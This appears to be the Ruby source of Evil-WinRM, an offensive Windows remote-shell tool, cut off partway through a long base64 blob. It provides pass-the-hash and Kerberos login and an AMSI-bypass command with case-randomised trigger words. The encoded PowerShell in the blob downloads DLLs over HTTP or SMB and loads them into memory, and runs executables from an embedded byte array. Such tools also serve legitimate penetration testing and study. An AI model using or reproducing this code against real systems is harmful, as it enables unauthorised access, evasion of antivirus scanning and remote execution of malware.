#!/usr/bin/env ruby
# -*- encoding : utf-8 -*-
# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

# Dependencies
require 'winrm'
require 'winrm-fs'
require 'stringio'
require 'base64'
require 'readline'
require 'optionparser'
require 'io/console'
require 'time'
require 'fileutils'
require 'logger'

# Constants

# Version
VERSION = '3.4'

# Msg types
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3
TYPE_SUCCESS = 4

# Global vars

# Available commands
$LIST = ['Bypass-4MSI', 'services', 'upload', 'download', 'menu', 'exit']
$COMMANDS = $LIST.dup
$CMDS = $COMMANDS.clone
$LISTASSEM = [''].sort
$DONUTPARAM1 = ['-process_id']
$DONUTPARAM2 = ['-donutfile']

# Colors and path completion
$colors_enabled = true
$check_rpath_completion = true

# Path for ps1 scripts and exec files
$scripts_path = ""
$executables_path = ""

# Connection vars initialization
$host = ""
$port = "5985"
$user = ""
$password = ""
$url = "wsman"
$default_service = "HTTP"
$full_logging_path = ENV["HOME"]+"/evil-winrm-logs"

# Redefine download method from winrm-fs
module WinRM
    module FS
        class FileManager
            def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
                @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
                index = 0
                output = _output_from_file(remote_path, chunk_size, index)
                return download_dir(remote_path, local_path, chunk_size, first) if output.exitcode == 2

                return false if output.exitcode >= 1

                File.open(local_path, 'wb') do |fd|
                    out = _write_file(fd, output)
                    index += out.length
                    until out.empty?
                        if size != -1
                            yield index, size
                        end
                        output = _output_from_file(remote_path, chunk_size, index)
                        return false if output.exitcode >= 1

                        out = _write_file(fd, output)
                        index += out.length
                    end
                end
            end

            true
        end
    end
end

# Class creation
class EvilWinRM

    # Initialization
    def initialize()
        @directories = Hash.new
        @cache_ttl = 10
        @executables = Array.new
        @functions = Array.new
        @Bypass_4MSI_loaded = false
        @blank_line = false
        @bypass_amsi_words_random_case = [
            "[Runtime.InteropServices.Marshal]",
            "function ",
            "WriteByte",
            "[Ref]",
            "Assembly.GetType",
            "GetField",
            "[System.Net.WebUtility]",
            "HtmlDecode",
            "Reflection.BindingFlags",
            "NonPublic",
            "Static",
            "GetValue",
        ]
    end

    # Remote path completion compatibility check
    def completion_check()
        if $check_rpath_completion == true then
             begin
                 Readline.quoting_detection_proc
                    @completion_enabled = true
                rescue NotImplementedError, NoMethodError => err
                    @completion_enabled = false
                    self.print_message("Remote path completions is disabled due to ruby limitation: #{err.to_s}", TYPE_WARNING)
                    self.print_message("For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion", TYPE_DATA)
                end
        else
            @completion_enabled = false
            self.print_message("Remote path completion is disabled", TYPE_WARNING)
        end

    end

    # Arguments
    def arguments()
        options = { port:$port, url:$url, service:$service }
        optparse = OptionParser.new do |opts|
            opts.banner = "Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]"
            opts.on("-S", "--ssl", "Enable ssl") do |val|
                $ssl = true
                options[:port] = "5986"
            end
            opts.on("-c", "--pub-key PUBLIC_KEY_PATH", "Local path to public key certificate") { |val| options[:pub_key] = val }
            opts.on("-k", "--priv-key PRIVATE_KEY_PATH", "Local path to private key certificate") { |val| options[:priv_key] = val }
            opts.on("-r", "--realm DOMAIN", "Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }") { |val| options[:realm] = val.upcase }
            opts.on("-s", "--scripts PS_SCRIPTS_PATH", "Powershell scripts local path") { |val| options[:scripts] = val }
            opts.on("--spn SPN_PREFIX", "SPN prefix for Kerberos auth (default HTTP)") { |val| options[:service] = val }
            opts.on("-e", "--executables EXES_PATH", "C# executables local path") { |val| options[:executables] = val }
            opts.on("-i", "--ip IP", "Remote host IP or hostname. FQDN for Kerberos auth (required)") { |val| options[:ip] = val }
            opts.on("-U", "--url URL", "Remote url endpoint (default /wsman)") { |val| options[:url] = val }
            opts.on("-u", "--user USER", "Username (required if not using kerberos)") { |val| options[:user] = val }
            opts.on("-p", "--password PASS", "Password") { |val| options[:password] = val }
            opts.on("-H", "--hash HASH", "NTHash") do |val|
                if !options[:password].nil? and !val.nil?
                    self.print_header()
                    self.print_message("You must choose either password or hash auth. Both at the same time are not allowed", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                if !val.match /^[a-fA-F0-9]{32}$/
                    self.print_header()
                    self.print_message("Invalid hash format", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                options[:password] = "00000000000000000000000000000000:#{val}"
            end
            opts.on("-P", "--port PORT", "Remote host port (default 5985)") { |val| options[:port] = val }
            opts.on("-V", "--version", "Show version") do |val|
                puts("v#{VERSION}")
                self.custom_exit(0, false)
            end
            opts.on("-n", "--no-colors", "Disable colors") do |val|
                $colors_enabled = false
            end
            opts.on("-N", "--no-rpath-completion", "Disable remote path completion") do |val|
                $check_rpath_completion = false
            end
            opts.on("-l","--log","Log the WinRM session") do|val|
                $log = true
                $filepath = ""
                $logfile = ""
                $logger = ""
            end
            opts.on("-h", "--help", "Display this help message") do
                self.print_header()
                puts(opts)
                puts()
                self.custom_exit(0, false)
            end
        end

        begin
            optparse.parse!
        if options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil? then
            mandatory = [:ip, :user]
        else
            mandatory = [:ip]
        end
            missing = mandatory.select{ |param| options[param].nil? }
            unless missing.empty?
                raise OptionParser::MissingArgument.new(missing.join(', '))
            end
        rescue OptionParser::InvalidOption, OptionParser::MissingArgument
            self.print_header()
            self.print_message($!.to_s, TYPE_ERROR, true, $logger)
            puts(optparse)
            puts()
            custom_exit(1, false)
        end

        if options[:password].nil? and options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil?
            options[:password] = STDIN.getpass(prompt='Enter Password: ')
        end

        $host = options[:ip]
        $user = options[:user]
        $password = options[:password]
        $port = options[:port]
        $scripts_path = options[:scripts]
        $executables_path = options[:executables]
        $url = options[:url]
        $pub_key = options[:pub_key]
        $priv_key = options[:priv_key]
        $realm = options[:realm]
        $service = options[:service]
        if !$log.nil? then
            if !Dir.exists?($full_logging_path)
                Dir.mkdir $full_logging_path
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m"))
                Dir.mkdir $full_logging_path + "/" + Time.now.strftime("%Y%d%m")
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host)
                Dir.mkdir $full_logging_path+ "/" + Time.now.strftime("%Y%d%m") + "/" + $host
            end
            $filepath = $full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host + "/" + Time.now.strftime("%H%M%S")
            $logger = Logger.new($filepath)
            $logger.formatter = proc do |severity, datetime, progname, msg|
                "#{datetime}: #{msg}\n"
            end
        end
        if !$realm.nil? then
            if $service.nil? then
                $service = $default_service
            end
        end
    end

    # Print script header
    def print_header()
         puts()
         self.print_message("Evil-WinRM shell v#{VERSION}", TYPE_INFO, false)
     end

    # Generate connection object
    def connection_initialization()
        if $ssl then
            if $pub_key and $priv_key then
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl,
                    client_cert: $pub_key,
                    client_key: $priv_key,
                )
            else
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl
                )
            end

        elsif !$realm.nil? then
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: "",
                password: "",
                transport: :kerberos,
                realm: $realm,
                service: $service
            )
        else
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: $user,
                password: $password,
                :no_ssl_peer_verification => true
            )
        end
    end

    # Detect if a docker environment
    def docker_detection()
        if File.exist?("/.dockerenv") then
            return true
        else
            return false
        end
    end

    # Define colors
    def colorize(text, color = "default")
        colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35", "green" => "1;32"}
        color_code = colors[color]
        return "\001\033[0;#{color_code}m\002#{text}\001\033[0m\002"
    end

    # Messsage printing
    def print_message(msg, msg_type=TYPE_INFO, prefix_print=true, log=nil)
        if msg_type == TYPE_INFO then
            msg_prefix = "Info: "
            color = "blue"
        elsif msg_type == TYPE_WARNING then
            msg_prefix = "Warning: "
            color = "yellow"
        elsif msg_type == TYPE_ERROR then
            msg_prefix = "Error: "
            color = "red"
        elsif msg_type == TYPE_DATA then
            msg_prefix = "Data: "
            color = 'magenta'
        elsif msg_type == TYPE_SUCCESS then
            color = 'green'
        else
            msg_prefix = ""
            color = "default"
        end

        if !prefix_print then
            msg_prefix = ""
        end
        if $colors_enabled then
            puts(self.colorize("#{msg_prefix}#{msg}", color))
        else
            puts("#{msg_prefix}#{msg}")
        end

        if !log.nil?
            log.info("#{msg_prefix}#{msg}")
        end
        puts()
    end

    # Certificates validation
    def check_certs(pub_key, priv_key)
         if !File.file?(pub_key) then
            self.print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !File.file?($priv_key) then
            self.print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    # Directories validation
    def check_directories(path, purpose)
        if path == "" then
            self.print_message("The directory used for #{purpose} can't be empty. Please set a path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM).nil? then
            # Windows
            if path[-1] != "\\" then
                path.concat("\\")
            end
        else
            # Unix
            if path[-1] != "/" then
                path.concat("/")
            end
        end

        if !File.directory?(path) then
            self.print_message("The directory \"#{path}\" used for #{purpose} was not found", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if purpose == "scripts" then
            $scripts_path = path
        elsif purpose == "executables" then
            $executables_path = path
        end
    end

    # Silent warnings
    def silent_warnings
        old_stderr = $stderr
        $stderr = StringIO.new
        yield
    ensure
        $stderr = old_stderr
    end

    # Read powershell script files
    def read_scripts(scripts)
        files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) } || []
        return files.grep(/^*\.(ps1|psd1|psm1)$/)
    end

    # Read executable files
    def read_executables(executables)
        files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
        return files
    end

    # Read local files and directories names
    def paths(a_path)
        parts = self.get_dir_parts(a_path)
        my_dir = parts[0]
        grep_for = parts[1]

        my_dir = File.expand_path(my_dir)
        my_dir = my_dir + "/" unless my_dir[-1] == '/'

        files = Dir.glob("#{my_dir}*", File::FNM_DOTMATCH)
        directories = Dir.glob("#{my_dir}*").select {|f| File.directory? f}

        result = files + directories || []

        result.grep( /^#{Regexp.escape(my_dir)}#{grep_for}/i ).uniq
    end

    # Custom exit
    def custom_exit(exit_code = 0, message_print=true)
        if message_print then
            if exit_code == 0 then
                puts()
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_INFO, true, $logger)
            elsif exit_code == 1 then
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            elsif exit_code == 130 then
                puts()
                self.print_message("Exiting...", TYPE_INFO, true, $logger)
            else
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            end
        end
        exit(exit_code)
    end

    # Progress bar
    def progress_bar(bytes_done, total_bytes)
        progress = ((bytes_done.to_f / total_bytes.to_f) * 100).round
        progress_bar = (progress / 10).round
        progress_string = "▓" * (progress_bar-1).clamp(0,9)
        progress_string = progress_string + "▒" + ("░" * (10-progress_bar))
        message = "Progress: #{progress}% : |#{progress_string}|          \r"
        print message
    end

    # Get filesize
    def filesize(shell, path)
        size = shell.run("(get-item '#{path}').length").output.strip.to_i
        return size
    end

    # Main function
    def main
        self.arguments()
        self.connection_initialization()
        file_manager = WinRM::FS::FileManager.new($conn)
        self.print_header()
        self.completion_check()

        # Log check
        if !$log.nil? then
            self.print_message("Logging Enabled. Log file: #{$filepath}", TYPE_WARNING, true)
        end

        # SSL checks
        if !$ssl and ($pub_key or $priv_key) then
            self.print_message("Useless cert/s provided, SSL is not enabled", TYPE_WARNING, true, $logger)
        elsif $ssl
            self.print_message("SSL enabled", TYPE_WARNING)
        end

        if $ssl and ($pub_key or $priv_key) then
            self.check_certs($pub_key, $priv_key)
        end

        # Kerberos checks
         if !$user.nil? and !$realm.nil?
            self.print_message("User is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if !$password.nil? and !$realm.nil?
            self.print_message("Password is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if $realm.nil? and !$service.nil? then
            self.print_message("Useless spn provided, only used for Kerberos auth", TYPE_WARNING, true, $logger)
        end

        if !$scripts_path.nil? then
            self.check_directories($scripts_path, "scripts")
            @functions = self.read_scripts($scripts_path)
            self.silent_warnings do
                $LIST = $LIST + @functions
            end
        end

        if !$executables_path.nil? then
            self.check_directories($executables_path, "executables")
            @executables = self.read_executables($executables_path)
        end
        menu = Base64.decode64("JG1lbnUgPSBAIgoKICAgLC4gICAoICAgLiAgICAgICkgICAgICAgICAgICAgICAiICAgICAgICAgICAgLC4gICAoICAgLiAgICAgICkgICAgICAgLiAgIAogICgiICAoICApICApJyAgICAgLCcgICAgICAgICAgICAgKGAgICAgICdgICAgICgiICAgICApICApJyAgICAgLCcgICAuICAsKSAgCi47ICkgICcgKCggKCIgKSAgICA7KCwgICAgICAuICAgICA7KSAgIiAgKSIgIC47ICkgICcgKCggKCIgKSAgICk7KCwgICApKCggICAKXyIuLF8sLl9fKS4sKSAoLi5fKCAuXyksICAgICApICAsICguXy4uKCAnLi5fIi5fLCAuICcuXylfKC4uLF8oXyIuKSBfKCBfJykgIApcXyAgIF9fX19fL19fICBffF9ffCAgfCAgICAoKCAgKCAgLyAgXCAgICAvICBcX198IF9fX19cX19fX19fICAgXCAgLyAgICAgXCAgCiB8ICAgIF9fKV9cICBcLyAvICB8ICB8ICAgIDtfKV8nKSBcICAgXC9cLyAgIC8gIHwvICAgIFx8ICAgICAgIF8vIC8gIFwgLyAgXCAKIHwgICAgICAgIFxcICAgL3wgIHwgIHxfXyAvX19fX18vICBcICAgICAgICAvfCAgfCAgIHwgIFwgICAgfCAgIFwvICAgIFkgICAgXAovX19fX19fXyAgLyBcXy8gfF9ffF9fX18vICAgICAgICAgICBcX18vXCAgLyB8X198X19ffCAgL19fX198XyAgL1xfX19ffF9fICAvCiAgICAgICAgXC8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgICAgICAgXC8gICAgICAgXC8gICAgICAgICBcLwoKICAgICAgIEJ5OiBDeWJlclZhY2EsIE9zY2FyQWthRWx2aXMsIEphcmlsYW9zLCBBcmFsZTYxIEBIYWNrcGxheWVycwoiQAoKaWYgKCRmdW5jaW9uZXNfcHJldmlhcy5jb3VudCAtbGUgMSkgeyRmdW5jaW9uZXNfcHJldmlhcyA9IChscyBmdW5jdGlvbjopLk5hbWV9CmZ1bmN0aW9uIG1lbnUgewpbYXJyYXldJGZ1bmNpb25lc19udWV2YXMgPSAobHMgZnVuY3Rpb246IHwgV2hlcmUtT2JqZWN0IHsoJF8ubmFtZSkuTGVuZ3RoIC1nZSAiNCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDbGVhci1Ib3N0KiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDb252ZXJ0RnJvbS1TZGRsU3RyaW5nKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJGb3JtYXQtSGV4KiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtRmlsZUhhc2gqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkdldC1WZXJiKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJoZWxwIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkltcG9ydC1Qb3dlclNoZWxsRGF0YUZpbGUqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkltcG9ydFN5c3RlbU1vZHVsZXMqIiAtYW5kICRfLm5hbWUgLW5lICJNYWluIiAtYW5kICRfLm5hbWUgLW5lICJta2RpciIgLWFuZCAkXy5uYW1lIC1uZSAiY2QuLiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgIm1vcmUiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiTmV3LUd1aWQqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIk5ldy1UZW1wb3JhcnlGaWxlKiIgLWFuZCAkXy5uYW1lIC1uZSAiUGF1c2UiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiVGFiRXhwYW5zaW9uMioiIC1hbmQgJF8ubmFtZSAtbmUgInByb21wdCIgLWFuZCAkXy5uYW1lIC1uZSAibWVudSIgLWFuZCAkXy5uYW1lIC1uZSAiYXV0byIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJzaG93LW1ldGhvZHMtbG9hZGVkKiIgfSB8IHNlbGVjdC1vYmplY3QgbmFtZSApLm5hbWUKJG11ZXN0cmFfZnVuY2lvbmVzID0gKCRmdW5jaW9uZXNfbnVldmFzIHwgd2hlcmUgeyRmdW5jaW9uZXNfcHJlY2FyZ2FkYXMgLW5vdGNvbnRhaW5zICRffSkgfCBmb3JlYWNoIHsiYG5bK10gJF8ifQokbXVlc3RyYV9mdW5jaW9uZXMgPSAkbXVlc3RyYV9mdW5jaW9uZXMgLXJlcGxhY2UgIiAgIiwiIiAKJG1lbnUgPSAkbWVudSArICRtdWVzdHJhX2Z1bmNpb25lcyArICJgbiIKJG1lbnUgPSAkbWVudSAtcmVwbGFjZSAiIFsrXSIsIlsrXSIKV3JpdGUtSG9zdCAkbWVudQoKfQoKZnVuY3Rpb24gRGxsLUxvYWRlciB7CiAgICBwYXJhbShbc3dpdGNoXSRzbWIsIFtzd2l0Y2hdJGxvY2FsLCBbc3dpdGNoXSRodHRwLCBbc3RyaW5nXSRwYXRoKQoKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgZGxsIGxvYWRlci4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IERsbC1Mb2FkZXIKICAgIEF1dGhvcjogSGVjdG9yIGRlIEFybWFzICgzdjRTaTBOKQoKICAgIFJlcXVpcmVkIGRlcGVuZGVuY2llczogTm9uZQogICAgT3B0aW9uYWwgZGVwZW5kZW5jaWVzOiBOb25lCi5ERVNDUklQVElPTgogICAgLgouRVhBTVBMRQogICAgRGxsLUxvYWRlciAtc21iIC1wYXRoIFxcMTkyLjE2OC4xMzkuMTMyXFxzaGFyZVxcbXlEbGwuZGxsCiAgICBEbGwtTG9hZGVyIC1sb2NhbCAtcGF0aCBDOlxVc2Vyc1xQZXBpdG9cRGVza3RvcFxteURsbC5kbGwKICAgIERsbC1Mb2FkZXIgLWh0dHAgLXBhdGggaHR0cDovL2V4YW1wbGUuY29tL215RGxsLmRsbAoKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBsb2FkcyBhbiBhcmJpdHJhcnkgZGxsCiJACgogICAgaWYgKCgkc21iIC1lcSAkZmFsc2UgLWFuZCAkbG9jYWwgLWVxICRmYWxzZSAtYW5kICRodHRwIC1lcSAkZmFsc2UpIC1vciAoJHBhdGggLWVxICIiIC1vciAkcGF0aCAtZXEgJG51bGwpKQogICAgewogICAgICAgIHdyaXRlLWhvc3QgIiRoZWxwYG4iCiAgICB9CiAgICBlbHNlCiAgICB7CgogICAgICAgIGlmICgkaHR0cCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBieSBIVFRQIgogICAgICAgICAgICAkd2ViY2xpZW50ID0gW05ldC5XZWJDbGllbnRdOjpuZXcoKQogICAgICAgICAgICAkZGxsID0gJHdlYmNsaWVudC5Eb3dubG9hZERhdGEoJHBhdGgpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGlmKCRzbWIpeyBXcml0ZS1Ib3N0ICJbK10gUmVhZGluZyBkbGwgYnkgU01CIiB9CiAgICAgICAgICAgIGVsc2UgeyBXcml0ZS1Ib3N0ICJbK10gUmVhZGluZyBkbGwgbG9jYWxseSIgfQoKICAgICAgICAgICAgJGRsbCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkcGF0aCkKICAgICAgICB9CiAgICAgICAgCgogICAgICAgIGlmICgkZGxsIC1uZSAkbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBMb2FkaW5nIGRsbC4uLiIKICAgICAgICAgICAgJGFzc2VtYmx5X2xvYWRlZCA9IFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoJGRsbCkKICAgICAgICAgICAgJG9iaiA9ICgoJGFzc2VtYmx5X2xvYWRlZC5HZXRFeHBvcnRlZFR5cGVzKCkgfCBTZWxlY3QtT2JqZWN0IERlY2xhcmVkTWV0aG9kcyApLkRlY2xhcmVkTWV0aG9kcyB8IFdoZXJlLU9iamVjdCB7JF8uaXNwdWJsaWMgLWVxICR0cnVlfSB8IFNlbGVjdC1PYmplY3QgRGVjbGFyaW5nVHlwZSxuYW1lIC1VbmlxdWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgKQogICAgICAgICAgICBbYXJyYXldJG1ldGhvZHMgPSBmb3JlYWNoICgkYXNzZW1ibHlwcm9wZXJ0aWVzIGluICRvYmopIHsgJG5hbWVzcGFjZSA9ICRhc3NlbWJseXByb3BlcnRpZXMuRGVjbGFyaW5nVHlwZS50b3N0cmluZygpOyAkbWV0b2RvID0gJGFzc2VtYmx5cHJvcGVydGllcy5uYW1lLnRvc3RyaW5nKCk7ICJbIiArICRuYW1lc3BhY2UgKyAiXSIgKyAiOjoiICsgJG1ldG9kbyArICIoKSIgfQogICAgICAgICAgICAkbWV0aG9kcyA9ICRtZXRob2RzIHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlIDsgJGdsb2JhbDpzaG93bWV0aG9kcyA9ICAgKCRtZXRob2RzfCB3aGVyZSB7ICRnbG9iYWw6c2hvd21ldGhvZHMgIC1ub3Rjb250YWlucyAkX30pIHwgZm9yZWFjaCB7IiRfYG4ifQogICAgICAgICAgICAKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIGF1dG8gewpbYXJyYXldJGZ1bmNpb25lc19udWV2YXMgPSAobHMgZnVuY3Rpb246IHwgV2hlcmUtT2JqZWN0IHsoJF8ubmFtZSkuTGVuZ3RoIC1nZSAiNCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDbGVhci1Ib3N0KiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDb252ZXJ0RnJvbS1TZGRsU3RyaW5nIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkZvcm1hdC1IZXgiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiR2V0LUZpbGVIYXNoKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtVmVyYioiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiaGVscCIgLWFuZCAkXy5uYW1lIC1uZSAiSW1wb3J0LVBvd2VyU2hlbGxEYXRhRmlsZSIgLWFuZCAkXy5uYW1lIC1uZSAiSW1wb3J0U3lzdGVtTW9kdWxlcyIgLWFuZCAkXy5uYW1lIC1uZSAiTWFpbiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgImNkLi4iIC1hbmQgJF8ubmFtZSAtbmUgIm1rZGlyIiAtYW5kICRfLm5hbWUgLW5lICJtb3JlIiAtYW5kICRfLm5hbWUgLW5lICJOZXctR3VpZCIgLWFuZCAkXy5uYW1lIC1uZSAiTmV3LVRlbXBvcmFyeUZpbGUiIC1hbmQgJF8ubmFtZSAtbmUgIlBhdXNlIiAtYW5kICRfLm5hbWUgLW5lICJUYWJFeHBhbnNpb24yIiAtYW5kICRfLm5hbWUgLW5lICJwcm9tcHQiIC1hbmQgJF8ubmFtZSAtbmUgIm1lbnUiIC1hbmQgJF8ubmFtZSAtbmUgInNob3ctbWV0aG9kcy1sb2FkZWQifSB8IHNlbGVjdC1vYmplY3QgbmFtZSApLm5hbWUKJG11ZXN0cmFfZnVuY2lvbmVzID0gKCRmdW5jaW9uZXNfbnVldmFzIHwgd2hlcmUgeyRmdW5jaW9uZXNfcHJlY2FyZ2FkYXMgLW5vdGNvbnRhaW5zICRffSkgfCBmb3JlYWNoIHsiJF9gbiJ9CiRtdWVzdHJhX2Z1bmNpb25lcyA9ICRtdWVzdHJhX2Z1bmNpb25lcyAtcmVwbGFjZSAiICAiLCIiIAokbXVlc3RyYV9mdW5jaW9uZXMKCgp9CmZ1bmN0aW9uIEludm9rZS1CaW5hcnkge3BhcmFtKCRhcmcpCiAgICAkaGVscD1AIgouU1lOT1BTSVMKICAgIEV4ZWN1dGUgYmluYXJpZXMgZnJvbSBtZW1vcnkuCiAgICBQb3dlclNoZWxsIEZ1bmN0aW9uOiBJbnZva2UtQmluYXJ5CiAgICBBdXRob3I6IEx1aXMgVmFjYXMgKEN5YmVyVmFjYSkKCiAgICBSZXF1aXJlZCBkZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIGRlcGVuZGVuY2llczogTm9uZQouREVTQ1JJUFRJT04KICAgIAouRVhBTVBMRQogICAgSW52b2tlLUJpbmFyeSAvb3B0L2NzaGFycC9XYXRzb24uZXhlCiAgICBJbnZva2UtQmluYXJ5IC9vcHQvY3NoYXJwL0JpbmFyeS5leGUgcGFyYW0xLHBhcmFtMixwYXJhbTMKICAgIEludm9rZS1CaW5hcnkgL29wdC9jc2hhcnAvQmluYXJ5LmV4ZSAncGFyYW0xLCBwYXJhbTIsIHBhcmFtMycKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBleGVjdXRlIGJpbmFyaWVzIGZyb20gbWVtb3J5LgoKCiJACmlmICgkYXJnIC1lcSAkbnVsbCkgeyRoZWxwfSBlbHNlIHsKW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKFtieXRlW11dQCg3NywgOTAsIDE0NCwgMCwgMywgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMjU1LCAyNTUsIDAsIDAsIDE4NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMTQsIDMxLCAxODYsIDE0LCAwLCAxODAsIDksIDIwNSwgMzMsIDE4NCwgMSwgNzYsIDIwNSwgMzMsIDg0LCAxMDQsIDEwNSwgMTE1LCAzMiwgMTEyLCAxMTQsIDExMSwgMTAzLCAxMTQsIDk3LCAxMDksIDMyLCA5OSwgOTcsIDExMCwgMTEwLCAxMTEsIDExNiwgMzIsIDk4LCAxMDEsIDMyLCAxMTQsIDExNywgMTEwLCAzMiwgMTA1LCAxMTAsIDMyLCA2OCwgNzksIDgzLCAzMiwgMTA5LCAxMTEsIDEwMCwgMTAxLCA0NiwgMTMsIDEzLCAxMCwgMzYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDgwLCA2OSwgMCwgMCwgNzYsIDEsIDMsIDAsIDI0NSwgMTgyLCAyMzEsIDkyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAyMjQsIDAsIDIsIDMzLCAxMSwgMSwgMTEsIDAsIDAsIDEwLCAwLCAwLCAwLCA2LCAwLCAwLCAwLCAwLCAwLCAwLCA5NCwgNDEsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMTYsIDAsIDMyLCAwLCAwLCAwLCAyLCAwLCAwLCA0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDAsIDAsIDAsIDMsIDAsIDk2LCAxMzMsIDAsIDAsIDE2LCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMTYsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTIsIDQxLCAwLCAwLCA3OSwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDQwLCAzLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA5NiwgMCwgMCwgMTIsIDAsIDAsIDAsIDIxMiwgMzksIDAsIDAsIDI4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAw